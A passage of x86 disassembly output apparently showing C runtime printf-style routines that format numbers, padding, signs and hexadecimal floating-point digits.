  4046cb:	js     0x4047f0
  4046d1:	mov    eax,DWORD PTR [ebx+0xc]
  4046d4:	cmp    eax,ecx
  4046d6:	jge    0x4047f0
  4046dc:	sub    ecx,eax
  4046de:	test   ecx,ecx
  4046e0:	mov    DWORD PTR [ebx+0x8],ecx
  4046e3:	jle    0x4047fc
  4046e9:	test   eax,eax
  4046eb:	jle    0x404921
  4046f1:	sub    ecx,0x1
  4046f4:	test   esi,esi
  4046f6:	mov    DWORD PTR [ebx+0x8],ecx
  4046f9:	jle    0x404705
  4046fb:	test   BYTE PTR [ebx+0x5],0x10
  4046ff:	jne    0x40480e
  404705:	test   ecx,ecx
  404707:	jle    0x404749
  404709:	test   ebp,ebp
  40470b:	jne    0x40471b
  40470d:	mov    eax,DWORD PTR [ebx+0x4]
  404710:	test   eax,0x1c0
  404715:	je     0x404900
  40471b:	sub    ecx,0x1
  40471e:	test   ecx,ecx
  404720:	mov    DWORD PTR [ebx+0x8],ecx
  404723:	jle    0x404749
  404725:	test   DWORD PTR [ebx+0x4],0x600
  40472c:	jne    0x404749
  40472e:	jmp    0x40473c
  404730:	mov    edx,ebx
  404732:	mov    eax,0x20
  404737:	call   0x403bd0
  40473c:	mov    eax,DWORD PTR [ebx+0x8]
  40473f:	lea    edx,[eax-0x1]
  404742:	test   eax,eax
  404744:	mov    DWORD PTR [ebx+0x8],edx
  404747:	jg     0x404730
  404749:	test   ebp,ebp
  40474b:	jne    0x404870
  404751:	mov    eax,DWORD PTR [ebx+0x4]
  404754:	test   ah,0x1
  404757:	jne    0x404894
  40475d:	test   al,0x40
  40475f:	jne    0x404910
  404765:	mov    edx,DWORD PTR [ebx+0x8]
  404768:	test   edx,edx
  40476a:	jle    0x40477f
  40476c:	mov    eax,DWORD PTR [ebx+0x4]
  40476f:	and    eax,0x600
  404774:	cmp    eax,0x200
  404779:	je     0x4048a5
  40477f:	test   esi,esi
  404781:	jle    0x4048d1
  404787:	lea    eax,[ebx+0x1c]
  40478a:	mov    ebp,0x55555556
  40478f:	mov    DWORD PTR [esp+0xc],eax
  404793:	movzx  edx,BYTE PTR [edi]
  404796:	mov    eax,0x30
  40479b:	test   dl,dl
  40479d:	je     0x4047a5
  40479f:	add    edi,0x1
  4047a2:	movsx  eax,dl
  4047a5:	mov    edx,ebx
  4047a7:	call   0x403bd0
  4047ac:	sub    esi,0x1
  4047af:	je     0x4049bf
  4047b5:	test   BYTE PTR [ebx+0x5],0x10
  4047b9:	je     0x404793
  4047bb:	cmp    WORD PTR [ebx+0x1c],0x0
  4047c0:	je     0x404793
  4047c2:	mov    eax,esi
  4047c4:	imul   ebp
  4047c6:	mov    eax,esi
  4047c8:	sar    eax,0x1f
  4047cb:	sub    edx,eax
  4047cd:	lea    eax,[edx+edx*2]
  4047d0:	cmp    esi,eax
  4047d2:	jne    0x404793
  4047d4:	mov    eax,DWORD PTR [esp+0xc]
  4047d8:	mov    ecx,ebx
  4047da:	mov    edx,0x1
  4047df:	call   0x403c30
  4047e4:	jmp    0x404793
  4047e6:	lea    esi,[esi+0x0]
  4047e9:	lea    edi,[edi+eiz*1+0x0]
  4047f0:	mov    DWORD PTR [ebx+0x8],0xffffffff
  4047f7:	mov    ecx,0xffffffff
  4047fc:	test   esi,esi
  4047fe:	jle    0x404749
  404804:	test   BYTE PTR [ebx+0x5],0x10
  404808:	je     0x404749
  40480e:	cmp    WORD PTR [ebx+0x1c],0x0
  404813:	je     0x404705
  404819:	lea    eax,[esi+0x2]
  40481c:	mov    edx,0x55555556
  404821:	mov    DWORD PTR [esp+0xc],eax
  404825:	imul   edx
  404827:	mov    eax,DWORD PTR [esp+0xc]
  40482b:	sar    eax,0x1f
  40482e:	sub    edx,eax
  404830:	cmp    edx,0x1
  404833:	jle    0x404705
  404839:	test   ecx,ecx
  40483b:	jle    0x404749
  404841:	mov    eax,ecx
  404843:	sub    eax,edx
  404845:	add    eax,0x1
  404848:	jmp    0x404858
  40484a:	lea    esi,[esi+0x0]
  404850:	test   ecx,ecx
  404852:	je     0x4049b3
  404858:	sub    ecx,0x1
  40485b:	cmp    ecx,eax
  40485d:	jne    0x404850
  40485f:	mov    DWORD PTR [ebx+0x8],ecx
  404862:	jmp    0x404705
  404867:	mov    esi,esi
  404869:	lea    edi,[edi+eiz*1+0x0]
  404870:	mov    edx,ebx
  404872:	mov    eax,0x2d
  404877:	call   0x403bd0
  40487c:	jmp    0x404765
  404881:	test   ecx,ecx
  404883:	jle    0x4046c9
  404889:	sub    ecx,0x1
  40488c:	mov    DWORD PTR [ebx+0x8],ecx
  40488f:	jmp    0x4046d1
  404894:	mov    edx,ebx
  404896:	mov    eax,0x2b
  40489b:	call   0x403bd0
  4048a0:	jmp    0x404765
  4048a5:	sub    edx,0x1
  4048a8:	mov    DWORD PTR [ebx+0x8],edx
  4048ab:	nop
  4048ac:	lea    esi,[esi+eiz*1+0x0]
  4048b0:	mov    edx,ebx
  4048b2:	mov    eax,0x30
  4048b7:	call   0x403bd0
  4048bc:	mov    eax,DWORD PTR [ebx+0x8]
  4048bf:	lea    edx,[eax-0x1]
  4048c2:	test   eax,eax
  4048c4:	mov    DWORD PTR [ebx+0x8],edx
  4048c7:	jg     0x4048b0
  4048c9:	test   esi,esi
  4048cb:	jg     0x404787
  4048d1:	mov    eax,0x30
  4048d6:	mov    edx,ebx
  4048d8:	call   0x403bd0
  4048dd:	mov    eax,DWORD PTR [ebx+0xc]
  4048e0:	test   eax,eax
  4048e2:	jg     0x404950
  4048e4:	test   BYTE PTR [ebx+0x5],0x8
  4048e8:	jne    0x404950
  4048ea:	test   esi,esi
  4048ec:	jne    0x404993
  4048f2:	sub    eax,0x1
  4048f5:	mov    DWORD PTR [ebx+0xc],eax
  4048f8:	add    esp,0x1c
  4048fb:	pop    ebx
  4048fc:	pop    esi
  4048fd:	pop    edi
  4048fe:	pop    ebp
  4048ff:	ret    
  404900:	test   ah,0x6
  404903:	je     0x40473c
  404909:	jmp    0x404751
  40490e:	xchg   ax,ax
  404910:	mov    edx,ebx
  404912:	mov    eax,0x20
  404917:	call   0x403bd0
  40491c:	jmp    0x404765
  404921:	mov    eax,DWORD PTR [ebx+0x4]
  404924:	test   ah,0x8
  404927:	jne    0x4046f1
  40492d:	test   esi,esi
  40492f:	jle    0x404709
  404935:	test   ah,0x10
  404938:	je     0x404709
  40493e:	cmp    WORD PTR [ebx+0x1c],0x0
  404943:	jne    0x404819
  404949:	jmp    0x404709
  40494e:	xchg   ax,ax
  404950:	mov    eax,ebx
  404952:	call   0x4045b0
  404957:	test   esi,esi
  404959:	je     0x404979
  40495b:	jmp    0x404990
  40495d:	lea    esi,[esi+0x0]
  404960:	movzx  edx,BYTE PTR [edi]
  404963:	mov    eax,0x30
  404968:	test   dl,dl
  40496a:	je     0x404972
  40496c:	add    edi,0x1
  40496f:	movsx  eax,dl
  404972:	mov    edx,ebx
  404974:	call   0x403bd0
  404979:	mov    eax,DWORD PTR [ebx+0xc]
  40497c:	lea    edx,[eax-0x1]
  40497f:	test   eax,eax
  404981:	mov    DWORD PTR [ebx+0xc],edx
  404984:	jg     0x404960
  404986:	add    esp,0x1c
  404989:	pop    ebx
  40498a:	pop    esi
  40498b:	pop    edi
  40498c:	pop    ebp
  40498d:	ret    
  40498e:	xchg   ax,ax
  404990:	mov    eax,DWORD PTR [ebx+0xc]
  404993:	add    eax,esi
  404995:	mov    DWORD PTR [ebx+0xc],eax
  404998:	nop
  404999:	lea    esi,[esi+eiz*1+0x0]
  4049a0:	mov    edx,ebx
  4049a2:	mov    eax,0x30
  4049a7:	call   0x403bd0
  4049ac:	add    esi,0x1
  4049af:	jne    0x4049a0
  4049b1:	jmp    0x404979
  4049b3:	mov    DWORD PTR [ebx+0x8],0x0
  4049ba:	jmp    0x404749
  4049bf:	mov    eax,DWORD PTR [ebx+0xc]
  4049c2:	test   eax,eax
  4049c4:	jle    0x4049d0
  4049c6:	mov    eax,ebx
  4049c8:	call   0x4045b0
  4049cd:	jmp    0x404979
  4049cf:	nop
  4049d0:	test   BYTE PTR [ebx+0x5],0x8
  4049d4:	jne    0x4049c6
  4049d6:	jmp    0x4048f2
  4049db:	nop
  4049dc:	lea    esi,[esi+eiz*1+0x0]
  4049e0:	push   ebp
  4049e1:	push   edi
  4049e2:	sub    ecx,0x1
  4049e5:	push   esi
  4049e6:	push   ebx
  4049e7:	mov    ebx,0x66666667
  4049ec:	mov    ebp,edx
  4049ee:	mov    esi,0x1
  4049f3:	sub    esp,0x2c
  4049f6:	mov    DWORD PTR [esp+0x14],eax
  4049fa:	mov    eax,ecx
  4049fc:	mov    DWORD PTR [esp+0x18],ecx
  404a00:	sar    eax,0x1f
  404a03:	mov    edi,DWORD PTR [esp+0x40]
  404a07:	mov    DWORD PTR [esp+0x1c],eax
  404a0b:	mov    eax,ecx
  404a0d:	sar    ecx,0x1f
  404a10:	imul   ebx
  404a12:	mov    ebx,edx
  404a14:	sar    ebx,0x2
  404a17:	sub    ebx,ecx
  404a19:	je     0x404a33
  404a1b:	mov    ecx,0x66666667
  404a20:	mov    eax,ebx
  404a22:	sar    ebx,0x1f
  404a25:	add    esi,0x1
  404a28:	imul   ecx
  404a2a:	sar    edx,0x2
  404a2d:	sub    edx,ebx
  404a2f:	mov    ebx,edx
  404a31:	jne    0x404a20
  404a33:	mov    eax,DWORD PTR [edi+0x28]
  404a36:	cmp    esi,eax
  404a38:	cmovl  esi,eax
  404a3b:	mov    eax,DWORD PTR [edi+0x8]
  404a3e:	lea    edx,[esi+0x2]
  404a41:	cmp    eax,edx
  404a43:	jg     0x404aa0
  404a45:	mov    DWORD PTR [edi+0x8],0xffffffff
  404a4c:	mov    eax,DWORD PTR [esp+0x14]
  404a50:	mov    DWORD PTR [esp],edi
  404a53:	mov    ecx,0x1
  404a58:	mov    edx,ebp
  404a5a:	add    esi,0x1
  404a5d:	call   0x4046a0
  404a62:	mov    eax,DWORD PTR [edi+0x28]
  404a65:	mov    DWORD PTR [edi+0xc],eax
  404a68:	mov    eax,DWORD PTR [edi+0x4]
  404a6b:	mov    edx,eax
  404a6d:	and    eax,0x20
  404a70:	or     edx,0x1c0
  404a76:	or     eax,0x45
  404a79:	mov    DWORD PTR [edi+0x4],edx
  404a7c:	mov    edx,edi
  404a7e:	call   0x403bd0
  404a83:	add    DWORD PTR [edi+0x8],esi
  404a86:	mov    eax,DWORD PTR [esp+0x18]
  404a8a:	mov    ecx,edi
  404a8c:	mov    edx,DWORD PTR [esp+0x1c]
  404a90:	call   0x403f00
  404a95:	add    esp,0x2c
  404a98:	pop    ebx
  404a99:	pop    esi
  404a9a:	pop    edi
  404a9b:	pop    ebp
  404a9c:	ret    
  404a9d:	lea    esi,[esi+0x0]
  404aa0:	sub    eax,edx
  404aa2:	mov    DWORD PTR [edi+0x8],eax
  404aa5:	jmp    0x404a4c
  404aa7:	mov    esi,esi
  404aa9:	lea    edi,[edi+eiz*1+0x0]
  404ab0:	push   esi
  404ab1:	push   ebx
  404ab2:	mov    ebx,eax
  404ab4:	sub    esp,0x44
  404ab7:	mov    edx,DWORD PTR [eax+0xc]
  404aba:	test   edx,edx
  404abc:	js     0x404b30
  404abe:	add    edx,0x1
  404ac1:	fld    TBYTE PTR [esp+0x50]
  404ac5:	lea    eax,[esp+0x28]
  404ac9:	mov    DWORD PTR [esp+0x10],edx
  404acd:	mov    DWORD PTR [esp+0x18],eax
  404ad1:	lea    eax,[esp+0x2c]
  404ad5:	mov    DWORD PTR [esp+0x14],eax
  404ad9:	fstp   TBYTE PTR [esp+0x30]
  404add:	mov    eax,DWORD PTR [esp+0x30]
  404ae1:	mov    DWORD PTR [esp],eax
  404ae4:	mov    eax,DWORD PTR [esp+0x34]
  404ae8:	mov    DWORD PTR [esp+0x4],eax
  404aec:	mov    eax,DWORD PTR [esp+0x38]
  404af0:	mov    DWORD PTR [esp+0x8],eax
  404af4:	mov    eax,DWORD PTR [esp+0x3c]
  404af8:	mov    DWORD PTR [esp+0xc],eax
  404afc:	mov    eax,0x2
  404b01:	call   0x403ad0
  404b06:	mov    ecx,DWORD PTR [esp+0x2c]
  404b0a:	mov    esi,eax
  404b0c:	cmp    ecx,0xffff8000
  404b12:	je     0x404b40
  404b14:	mov    edx,eax
  404b16:	mov    eax,DWORD PTR [esp+0x28]
  404b1a:	mov    DWORD PTR [esp],ebx
  404b1d:	call   0x4049e0
  404b22:	mov    DWORD PTR [esp],esi
  404b25:	call   0x408240
  404b2a:	add    esp,0x44
  404b2d:	pop    ebx
  404b2e:	pop    esi
  404b2f:	ret    
  404b30:	mov    DWORD PTR [eax+0xc],0x6
  404b37:	mov    edx,0x7
  404b3c:	jmp    0x404ac1
  404b3e:	xchg   ax,ax
  404b40:	mov    edx,eax
  404b42:	mov    eax,DWORD PTR [esp+0x28]
  404b46:	mov    ecx,ebx
  404b48:	call   0x403e60
  404b4d:	mov    DWORD PTR [esp],esi
  404b50:	call   0x408240
  404b55:	add    esp,0x44
  404b58:	pop    ebx
  404b59:	pop    esi
  404b5a:	ret    
  404b5b:	nop
  404b5c:	lea    esi,[esi+eiz*1+0x0]
  404b60:	push   edi
  404b61:	push   esi
  404b62:	push   ebx
  404b63:	mov    ebx,eax
  404b65:	sub    esp,0x40
  404b68:	mov    eax,DWORD PTR [eax+0xc]
  404b6b:	test   eax,eax
  404b6d:	js     0x404c10
  404b73:	fld    TBYTE PTR [esp+0x50]
  404b77:	mov    DWORD PTR [esp+0x10],eax
  404b7b:	lea    edx,[esp+0x28]
  404b7f:	mov    DWORD PTR [esp+0x18],edx
  404b83:	lea    edx,[esp+0x2c]
  404b87:	mov    DWORD PTR [esp+0x14],edx
  404b8b:	fstp   TBYTE PTR [esp+0x30]
  404b8f:	mov    eax,DWORD PTR [esp+0x30]
  404b93:	mov    DWORD PTR [esp],eax
  404b96:	mov    eax,DWORD PTR [esp+0x34]
  404b9a:	mov    DWORD PTR [esp+0x4],eax
  404b9e:	mov    eax,DWORD PTR [esp+0x38]
  404ba2:	mov    DWORD PTR [esp+0x8],eax
  404ba6:	mov    eax,DWORD PTR [esp+0x3c]
  404baa:	mov    DWORD PTR [esp+0xc],eax
  404bae:	mov    eax,0x3
  404bb3:	call   0x403ad0
  404bb8:	mov    ecx,DWORD PTR [esp+0x2c]
  404bbc:	mov    edi,eax
  404bbe:	cmp    ecx,0xffff8000
  404bc4:	je     0x404c21
  404bc6:	mov    edx,eax
  404bc8:	mov    eax,DWORD PTR [esp+0x28]
  404bcc:	mov    DWORD PTR [esp],ebx
  404bcf:	call   0x4046a0
  404bd4:	mov    eax,DWORD PTR [ebx+0x8]
  404bd7:	lea    edx,[eax-0x1]
  404bda:	test   eax,eax
  404bdc:	mov    DWORD PTR [ebx+0x8],edx
  404bdf:	jle    0x404bfa
  404be1:	mov    edx,ebx
  404be3:	mov    eax,0x20
  404be8:	call   0x403bd0
  404bed:	mov    ecx,DWORD PTR [ebx+0x8]
  404bf0:	lea    esi,[ecx-0x1]
  404bf3:	test   ecx,ecx
  404bf5:	mov    DWORD PTR [ebx+0x8],esi
  404bf8:	jg     0x404be1
  404bfa:	mov    DWORD PTR [esp],edi
  404bfd:	call   0x408240
  404c02:	add    esp,0x40
  404c05:	pop    ebx
  404c06:	pop    esi
  404c07:	pop    edi
  404c08:	ret    
  404c09:	lea    esi,[esi+eiz*1+0x0]
  404c10:	mov    DWORD PTR [ebx+0xc],0x6
  404c17:	mov    eax,0x6
  404c1c:	jmp    0x404b73
  404c21:	mov    edx,eax
  404c23:	mov    eax,DWORD PTR [esp+0x28]
  404c27:	mov    ecx,ebx
  404c29:	call   0x403e60
  404c2e:	mov    DWORD PTR [esp],edi
  404c31:	call   0x408240
  404c36:	add    esp,0x40
  404c39:	pop    ebx
  404c3a:	pop    esi
  404c3b:	pop    edi
  404c3c:	ret    
  404c3d:	lea    esi,[esi+0x0]
  404c40:	push   edi
  404c41:	push   esi
  404c42:	push   ebx
  404c43:	mov    ebx,eax
  404c45:	sub    esp,0x40
  404c48:	mov    eax,DWORD PTR [eax+0xc]
  404c4b:	test   eax,eax
  404c4d:	js     0x404d80
  404c53:	je     0x404d63
  404c59:	fld    TBYTE PTR [esp+0x50]
  404c5d:	mov    DWORD PTR [esp+0x10],eax
  404c61:	lea    edx,[esp+0x28]
  404c65:	mov    DWORD PTR [esp+0x18],edx
  404c69:	lea    edx,[esp+0x2c]
  404c6d:	mov    DWORD PTR [esp+0x14],edx
  404c71:	fstp   TBYTE PTR [esp+0x30]
  404c75:	mov    eax,DWORD PTR [esp+0x30]
  404c79:	mov    DWORD PTR [esp],eax
  404c7c:	mov    eax,DWORD PTR [esp+0x34]
  404c80:	mov    DWORD PTR [esp+0x4],eax
  404c84:	mov    eax,DWORD PTR [esp+0x38]
  404c88:	mov    DWORD PTR [esp+0x8],eax
  404c8c:	mov    eax,DWORD PTR [esp+0x3c]
  404c90:	mov    DWORD PTR [esp+0xc],eax
  404c94:	mov    eax,0x2
  404c99:	call   0x403ad0
  404c9e:	mov    esi,DWORD PTR [esp+0x2c]
  404ca2:	mov    edi,eax
  404ca4:	cmp    esi,0xffff8000
  404caa:	je     0x404da0
  404cb0:	cmp    esi,0xfffffffd
  404cb3:	jl     0x404d30
  404cb5:	mov    eax,DWORD PTR [ebx+0xc]
  404cb8:	cmp    esi,eax
  404cba:	jg     0x404d30
  404cbc:	test   BYTE PTR [ebx+0x5],0x8
  404cc0:	jne    0x404d91
  404cc6:	mov    DWORD PTR [esp],edi
  404cc9:	call   0x40acd0
  404cce:	sub    eax,esi
  404cd0:	test   eax,eax
  404cd2:	mov    DWORD PTR [ebx+0xc],eax
  404cd5:	js     0x404db0
  404cdb:	mov    eax,DWORD PTR [esp+0x28]
  404cdf:	mov    edx,edi
  404ce1:	mov    DWORD PTR [esp],ebx
  404ce4:	mov    ecx,esi
  404ce6:	call   0x4046a0
  404ceb:	mov    eax,DWORD PTR [ebx+0x8]
  404cee:	lea    edx,[eax-0x1]
  404cf1:	test   eax,eax
  404cf3:	mov    DWORD PTR [ebx+0x8],edx
  404cf6:	jle    0x404d54
  404cf8:	nop
  404cf9:	lea    esi,[esi+eiz*1+0x0]
  404d00:	mov    edx,ebx
  404d02:	mov    eax,0x20
  404d07:	call   0x403bd0
  404d0c:	mov    ecx,DWORD PTR [ebx+0x8]
  404d0f:	lea    esi,[ecx-0x1]
  404d12:	test   ecx,ecx
  404d14:	mov    DWORD PTR [ebx+0x8],esi
  404d17:	jg     0x404d00
  404d19:	mov    DWORD PTR [esp],edi
  404d1c:	call   0x408240
  404d21:	add    esp,0x40
  404d24:	pop    ebx
  404d25:	pop    esi
  404d26:	pop    edi
  404d27:	ret    
  404d28:	nop
  404d29:	lea    esi,[esi+eiz*1+0x0]
  404d30:	test   BYTE PTR [ebx+0x5],0x8
  404d34:	jne    0x404d74
  404d36:	mov    DWORD PTR [esp],edi
  404d39:	call   0x40acd0
  404d3e:	sub    eax,0x1
  404d41:	mov    DWORD PTR [ebx+0xc],eax
  404d44:	mov    eax,DWORD PTR [esp+0x28]
  404d48:	mov    DWORD PTR [esp],ebx
  404d4b:	mov    ecx,esi
  404d4d:	mov    edx,edi
  404d4f:	call   0x4049e0
  404d54:	mov    DWORD PTR [esp],edi
  404d57:	call   0x408240
  404d5c:	add    esp,0x40
  404d5f:	pop    ebx
  404d60:	pop    esi
  404d61:	pop    edi
  404d62:	ret    
  404d63:	mov    DWORD PTR [ebx+0xc],0x1
  404d6a:	mov    eax,0x1
  404d6f:	jmp    0x404c59
  404d74:	sub    DWORD PTR [ebx+0xc],0x1
  404d78:	jmp    0x404d44
  404d7a:	lea    esi,[esi+0x0]
  404d80:	mov    DWORD PTR [ebx+0xc],0x6
  404d87:	mov    eax,0x6
  404d8c:	jmp    0x404c59
  404d91:	sub    eax,esi
  404d93:	mov    DWORD PTR [ebx+0xc],eax
  404d96:	jmp    0x404cdb
  404d9b:	nop
  404d9c:	lea    esi,[esi+eiz*1+0x0]
  404da0:	mov    edx,eax
  404da2:	mov    eax,DWORD PTR [esp+0x28]
  404da6:	mov    ecx,ebx
  404da8:	call   0x403e60
  404dad:	jmp    0x404d54
  404daf:	nop
  404db0:	mov    edx,DWORD PTR [ebx+0x8]
  404db3:	test   edx,edx
  404db5:	jle    0x404cdb
  404dbb:	add    eax,edx
  404dbd:	mov    DWORD PTR [ebx+0x8],eax
  404dc0:	jmp    0x404cdb
  404dc5:	lea    esi,[esi+eiz*1+0x0]
  404dc9:	lea    edi,[edi+eiz*1+0x0]
  404dd0:	push   ebp
  404dd1:	push   edi
  404dd2:	push   esi
  404dd3:	push   ebx
  404dd4:	mov    ebx,eax
  404dd6:	sub    esp,0x5c
  404dd9:	fld    TBYTE PTR [esp+0x70]
  404ddd:	fld    st(0)
  404ddf:	fstp   TBYTE PTR [esp+0x28]
  404de3:	fxam   
  404de5:	fstsw  ax
  404de8:	and    ax,0x4500
  404dec:	cmp    ax,0x100
  404df0:	je     0x4052d4
  404df6:	movzx  edi,WORD PTR [esp+0x30]
  404dfb:	mov    esi,edi
  404dfd:	and    esi,0x8000
  404e03:	jne    0x404f40
  404e09:	fxam   
  404e0b:	fstsw  ax
  404e0e:	fstp   st(0)
  404e10:	and    ax,0x4500
  404e14:	cmp    ax,0x500
  404e18:	je     0x4052e9
  404e1e:	and    di,0x7fff
  404e23:	mov    ecx,edi
  404e25:	je     0x404f50
  404e2b:	mov    ebp,DWORD PTR [ebx+0xc]
  404e2e:	lea    eax,[ecx-0x3fff]
  404e34:	mov    esi,DWORD PTR [esp+0x28]
  404e38:	mov    edi,DWORD PTR [esp+0x2c]
  404e3c:	mov    WORD PTR [esp+0x16],ax
  404e41:	cmp    ebp,0xe
  404e44:	jbe    0x4050a1
  404e4a:	mov    eax,edi
  404e4c:	or     eax,esi
  404e4e:	je     0x40526b
  404e54:	mov    eax,DWORD PTR [ebx+0x4]
  404e57:	lea    ecx,[esp+0x38]
  404e5b:	movzx  edx,WORD PTR [esp+0x16]
  404e60:	mov    DWORD PTR [esp+0x8],ebx
  404e64:	mov    ebp,ecx
  404e66:	mov    DWORD PTR [esp+0xc],ecx
  404e6a:	mov    ecx,eax
  404e6c:	mov    DWORD PTR [esp+0x18],eax
  404e70:	and    eax,0x20
  404e73:	and    ecx,0x800
  404e79:	mov    BYTE PTR [esp+0x10],al
  404e7d:	mov    DWORD PTR [esp+0x1c],ecx
  404e81:	mov    ecx,ebp
  404e83:	jmp    0x404ec7
  404e85:	mov    ebx,DWORD PTR [esp+0x8]
  404e89:	mov    ebx,DWORD PTR [ebx+0xc]
  404e8c:	test   ebx,ebx
  404e8e:	jle    0x404e9a
  404e90:	mov    ebp,DWORD PTR [esp+0x8]
  404e94:	sub    ebx,0x1
  404e97:	mov    DWORD PTR [ebp+0xc],ebx
  404e9a:	shrd   esi,edi,0x4
  404e9e:	shr    edi,0x4
  404ea1:	test   eax,eax
  404ea3:	mov    ebp,ecx
  404ea5:	je     0x404f1f
  404ea7:	cmp    eax,0x9
  404eaa:	lea    ecx,[ebp+0x1]
  404ead:	jle    0x404f37
  404eb3:	add    eax,0x37
  404eb6:	or     al,BYTE PTR [esp+0x10]
  404eba:	mov    BYTE PTR [ebp+0x0],al
  404ebd:	mov    eax,edi
  404ebf:	or     eax,esi
  404ec1:	je     0x404fa0
  404ec7:	mov    eax,esi
  404ec9:	and    eax,0xf
  404ecc:	cmp    eax,esi
  404ece:	jne    0x404e85
  404ed0:	cmp    ecx,DWORD PTR [esp+0xc]
  404ed4:	ja     0x404ef0
  404ed6:	mov    ebp,DWORD PTR [esp+0x1c]
  404eda:	test   ebp,ebp
  404edc:	jne    0x404ef0
  404ede:	mov    ebx,DWORD PTR [esp+0x8]
  404ee2:	mov    ebp,ecx
  404ee4:	mov    ebx,DWORD PTR [ebx+0xc]
  404ee7:	test   ebx,ebx
  404ee9:	jle    0x404ef6
  404eeb:	nop
  404eec:	lea    esi,[esi+eiz*1+0x0]
  404ef0:	lea    ebp,[ecx+0x1]
  404ef3:	mov    BYTE PTR [ecx],0x2e
  404ef6:	cmp    edi,0x0
  404ef9:	ja     0x404f00
  404efb:	cmp    esi,0x1
  404efe:	jbe    0x404f17
  404f00:	lea    ecx,[edx-0x1]
  404f03:	shrd   esi,edi,0x1
  404f07:	shr    edi,1
  404f09:	mov    edx,ecx
  404f0b:	mov    ebx,esi
  404f0d:	lea    ecx,[edx-0x1]
  404f10:	xor    ebx,0x1
  404f13:	or     ebx,edi
  404f15:	jne    0x404f03
  404f17:	xor    esi,esi
  404f19:	xor    edi,edi
  404f1b:	test   eax,eax
  404f1d:	jne    0x404ea7
  404f1f:	cmp    ebp,DWORD PTR [esp+0xc]
  404f23:	ja     0x404f34
  404f25:	mov    ecx,DWORD PTR [esp+0x8]
  404f29:	mov    ecx,DWORD PTR [ecx+0xc]
  404f2c:	test   ecx,ecx
  404f2e:	js     0x405120
  404f34:	lea    ecx,[ebp+0x1]
  404f37:	add    eax,0x30
  404f3a:	jmp    0x404eba
  404f3f:	nop
  404f40:	or     DWORD PTR [ebx+0x4],0x80
  404f47:	jmp    0x404e09
  404f4c:	lea    esi,[esi+eiz*1+0x0]
  404f50:	mov    edx,DWORD PTR [esp+0x2c]
  404f54:	mov    eax,DWORD PTR [esp+0x28]
  404f58:	mov    edi,edx
  404f5a:	or     edi,eax
  404f5c:	je     0x40525c
  404f62:	test   edx,edx
  404f64:	js     0x40530e
  404f6a:	mov    ecx,0xffffc001
  404f6f:	nop
  404f70:	shld   edx,eax,0x1
  404f74:	mov    edi,ecx
  404f76:	add    eax,eax
  404f78:	sub    ecx,0x1
  404f7b:	test   edx,edx
  404f7d:	jns    0x404f70
  404f7f:	mov    WORD PTR [esp+0x16],di
  404f84:	mov    esi,eax
  404f86:	mov    edi,edx
  404f88:	mov    ebp,DWORD PTR [ebx+0xc]
  404f8b:	cmp    ebp,0xe
  404f8e:	jbe    0x4050bf
  404f94:	jmp    0x404e54
  404f99:	lea    esi,[esi+eiz*1+0x0]
  404fa0:	cmp    ecx,DWORD PTR [esp+0xc]
  404fa4:	mov    WORD PTR [esp+0x16],dx
  404fa9:	mov    ebp,ecx
  404fab:	mov    ebx,DWORD PTR [esp+0x8]
  404faf:	je     0x405306
  404fb5:	mov    eax,DWORD PTR [ebx+0x8]
  404fb8:	test   eax,eax
  404fba:	mov    DWORD PTR [esp+0x8],eax
  404fbe:	jle    0x405249
  404fc4:	mov    eax,ebp
  404fc6:	sub    eax,DWORD PTR [esp+0xc]
  404fca:	mov    edx,DWORD PTR [ebx+0xc]
  404fcd:	movsx  edi,WORD PTR [esp+0x16]
  404fd2:	test   edx,edx
  404fd4:	lea    ecx,[eax+edx*1]
  404fd7:	mov    edx,DWORD PTR [esp+0x18]
  404fdb:	mov    DWORD PTR [esp+0x10],edi
  404fdf:	cmovg  eax,ecx
  404fe2:	mov    ecx,0x66666667
  404fe7:	and    edx,0x1c0
  404fed:	cmp    edx,0x1
  404ff0:	sbb    edx,edx
  404ff2:	lea    esi,[eax+edx*1+0x6]
  404ff6:	mov    eax,edi
  404ff8:	imul   ecx
  404ffa:	mov    eax,edi
  404ffc:	sar    eax,0x1f
  404fff:	mov    ecx,edx
  405001:	sar    ecx,0x2
  405004:	sub    ecx,eax
  405006:	je     0x4052fc
  40500c:	mov    edi,0x2
  405011:	mov    eax,0x66666667
  405016:	add    esi,0x1
  405019:	add    edi,0x1
  40501c:	imul   ecx
  40501e:	sar    ecx,0x1f
  405021:	sar    edx,0x2
  405024:	sub    edx,ecx
  405026:	mov    ecx,edx
  405028:	jne    0x405011
  40502a:	movsx  edi,di
  40502d:	cmp    DWORD PTR [esp+0x8],esi
  405031:	jle    0x405130
  405037:	mov    eax,DWORD PTR [esp+0x8]
  40503b:	sub    eax,esi
  40503d:	test   DWORD PTR [esp+0x18],0x600
  405045:	jne    0x405296
  40504b:	lea    edx,[eax-0x1]
  40504e:	test   eax,eax
  405050:	mov    DWORD PTR [ebx+0x8],edx
  405053:	jle    0x405137
  405059:	lea    esi,[esi+eiz*1+0x0]
  405060:	mov    edx,ebx
  405062:	mov    eax,0x20
  405067:	call   0x403bd0
  40506c:	mov    eax,DWORD PTR [ebx+0x8]
  40506f:	lea    edx,[eax-0x1]
  405072:	test   eax,eax
  405074:	mov    DWORD PTR [ebx+0x8],edx
  405077:	jg     0x405060
  405079:	mov    eax,DWORD PTR [ebx+0x4]
  40507c:	mov    DWORD PTR [esp+0x18],eax
  405080:	test   BYTE PTR [esp+0x18],0x80
  405085:	je     0x405142
  40508b:	nop
  40508c:	lea    esi,[esi+eiz*1+0x0]
  405090:	mov    edx,ebx
  405092:	mov    eax,0x2d
  405097:	call   0x403bd0
  40509c:	jmp    0x40515b
  4050a1:	test   edi,edi
  4050a3:	js     0x4050bf
  4050a5:	mov    ecx,eax
  4050a7:	mov    esi,esi
  4050a9:	lea    edi,[edi+eiz*1+0x0]
  4050b0:	shld   edi,esi,0x1
  4050b4:	add    esi,esi
  4050b6:	test   edi,edi
  4050b8:	jns    0x4050b0
  4050ba:	mov    WORD PTR [esp+0x16],cx
  4050bf:	mov    ecx,0xe
  4050c4:	mov    eax,0x4
  4050c9:	xor    edx,edx
  4050cb:	sub    ecx,ebp
  4050cd:	shl    ecx,0x2
  4050d0:	shrd   esi,edi,0x1
  4050d4:	shld   edx,eax,cl
  4050d7:	shr    edi,1
  4050d9:	shl    eax,cl
  4050db:	test   cl,0x20
  4050de:	je     0x4050e4
  4050e0:	mov    edx,eax
  4050e2:	xor    eax,eax
  4050e4:	add    eax,esi
  4050e6:	adc    edx,edi
  4050e8:	test   edx,edx
  4050ea:	js     0x4052c9
  4050f0:	shld   edx,eax,0x1
  4050f4:	add    eax,eax
